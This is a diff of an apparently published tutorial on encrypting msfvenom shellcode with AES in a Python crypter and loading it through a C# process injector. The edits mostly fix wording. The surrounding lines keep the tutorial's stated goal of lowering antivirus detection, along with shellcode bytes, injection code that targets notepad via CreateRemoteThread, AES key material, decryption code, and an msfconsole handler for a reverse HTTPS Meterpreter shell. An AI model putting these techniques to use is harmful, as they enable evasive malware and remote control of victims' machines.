@@ -2,9 +2,9 @@
 
 ## Overview
 
-We will create a simple python3 Crypter. The script will take raw shell code, in hex string format and encrypt it with AES encryption. The encrypted shell code will finally be encoded into a base64 string, ready to be used in a C# process injection executable.
+We will create a simple python3 script. The script will take raw shellcode, in hex string format and encrypt it with AES encryption. The encrypted shellcode will finally be encoded into a base64 string, ready to be used in a C# process injection executable.
 
-In this example, we will aim to reduce our detection rate on [AntiScan.me](https://antiscan.me/). To start we will use a basic process injection technique, by calling native DLLs with P/Invoke. This technique is not advanced and will not completely bypass antivirus detection, but it should show reductions in detection rates, when we encrypt the shell code.
+In this example, we will aim to reduce our detection rate on [AntiScan.me](https://antiscan.me/). To start we will use a basic process injection technique, by calling native DLLs with P/Invoke. This technique is not advanced and will not completely bypass antivirus detection, but it should show reductions in detection rates, when we encrypt the shellcode.
 
 ## The C# Process Injector
 
@@ -30,7 +30,7 @@ The shellcode was created with msfvenom and sits inside the main function in the
 byte[] buf = new byte[685] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 }
 ```
 
-The code then uses GetprocessesByName and retrieves an array of process components. The OpenProcess function then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the type of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shell code contained inside the buf byte array, into the allocated memory. CreateRemoteThread, then creates a thread that runs in notepad's virtual address space, executing the shell code.
+The code then uses GetprocessesByName and retrieves an array of process components. The OpenProcess function then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the type of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shellcode contained inside the buf byte array, into the allocated memory. CreateRemoteThread, then creates a thread that runs in notepad's virtual address space, executing the shellcode.
 
 ```csharp
 Process processName = Process.GetProcessesByName("notepad")[0];
@@ -81,7 +81,7 @@ Below is the output from the msfvenom command, when run in the Linux terminal. T
 
 ## Encrypting The Shellcode
 
-With our returned hex shell code (output.stdout), we will call the function 'aes_encrypt_shellcode(data)' and pass the msfvenom command as data. The following function will assemble the pieces needed to encrypt our data variable.
+With our returned hex shellcode (output.stdout), we will call the function 'aes_encrypt_shellcode(data)' and pass the msfvenom command as data. The following function will assemble the pieces needed to encrypt our data variable.
 
 ```python
 data = shell_format()
@@ -161,7 +161,7 @@ string IV64 = "rrCbahc3bgSFAZAmL/dHZA==";
 byte[] IV = Convert.FromBase64String(IV64);
 ```
 
-With the conversion of the base64 strings complete, wew can now decrypt the AES encrypted data. The code below creates a string variable named 'plaintext', this will hold our decrypted shell code. The rest of the code can be seen at the docs.microsoft pages, under the [Aes Class](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-6.0)
+With the conversion of the base64 strings complete, wew can now decrypt the AES encrypted data. The code below creates a string variable named 'plaintext', this will hold our decrypted shellcode. The rest of the code can be seen at the docs.microsoft pages, under the [Aes Class](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-6.0)
 
 ```csharp
 // DecryptStringFromBytes_Aes(shellBytes, Key, IV);
@@ -192,7 +192,7 @@ using (Aes aesAlg = Aes.Create())
 }
 ```
 
-With the shell code, as a hex string, now assigned to the 'plaintext' string variable, we must convert this string to a byte array, two hex characters at a time. We create a byte array named happyEnd, half the size of the plaintext string. We then take two characters from the string and add them to a list. Then from that list, we add each element to our happyEnd byte array and convert them to bytes.
+With the shellcode as a hex string, now assigned to the 'plaintext' string variable, we must convert this string to a byte array, two hex characters at a time. We create a byte array named happyEnd, half the size of the plaintext string. We then take two characters from the string and add them to a list. Then from that list, we add each element to our happyEnd byte array and convert them to bytes.
 
 ```csharp
 // Create byte array, half size of decrypted data
@@ -209,7 +209,7 @@ for (int i = 0; i < happyEnd.Length; i++)
 }
 ```
 
-The only changes to the end section of the code, are the use of the shell codes byte array name. 
+The end section of the code we change the byte array name. 
 
 ```csharp
 // === Process injection === \\
@@ -231,7 +231,7 @@ Uploading the new C# injector, we see that the detection rate has dropped signif
 
 ## Getting A Shell On The Target Machine
 
-To test that the InjectAes.exe functions correctly, we first set up a msfconsole listener on Kali Linux, with the following command. The listener will wait for the incoming connection, from shell code that was executed on the target machine (The C# Process Injection).
+To test that the InjectAes.exe functions correctly, we first set up a msfconsole listener on Kali Linux, with the following command. The listener will wait for the incoming connection, from shellcode that was executed on the target machine (The C# Process Injection).
 
 ```
 sudo msfconsole -q -x "use exploit/multi/handler/; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST eth0; set LPORT 443; run
